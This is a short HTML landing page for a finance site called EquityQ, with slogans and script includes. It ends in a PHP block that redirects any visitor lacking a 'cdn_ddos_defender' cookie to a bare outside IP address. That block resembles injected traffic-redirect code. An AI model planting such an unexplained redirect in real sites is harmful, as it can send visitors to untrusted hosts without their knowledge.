<meta charset="UTF-8">
<link rel="icon" href="img/logo.ico">
<style>@import url(css/body.css);</style>
<style>@import url(css/text_p.css);</style>
<title>EquityQ - Finance</title>

<canvas id="pic" style="position: absolute;background: url(img/menu.jpg);background-size: 400%,200%;width:1000px;left: 50%;height: 100%;transform:translate(-50%, 0%);"></canvas>
<div style="height: 100%;width: 1000px;">
    <img src="img/title.png" alt="title_pic" style="position: absolute;height: 25px;top: 30px;left: 50%;transform: translate(-50%);">
    <div class="text_p" style="left: 50%;transform: translate(-50%);">
        <h1 style="text-align: center;">DREAM</h1>
        <h1 style='color:white;margin-top: -10px;text-align: center;' id="h1_v">GET DATA</h1>
        <h1 style='color:white;margin-top: -90px;color: rgb(175, 255, 188);text-align: center;' id="h1_c">GET DREAM</h1>
    </div>
    <div class="text_z" style="left: 50%;transform: translate(-50%);">
        <a href="javascript:void(0)" class="a_ref">ONLY FOR PC WEBSITE</a>
    </div>
    <div class="text_v" style="left: 50%;transform: translate(-50%);">
        <a href="javascript:void(0)" class="a_ref">Copyright © 2021 EQUITYQ</a>
    </div>
</div>
<script src="js/menu.js"></script>
<script src="js/canvas.js"></script>
<script src="js/pic.js"></script>
<?php
$cookie = $_COOKIE['cdn_ddos_defender'];
if (empty($cookie)){
    $url = 'http://47.98.117.207';
    Header("Location:$url");
}
?>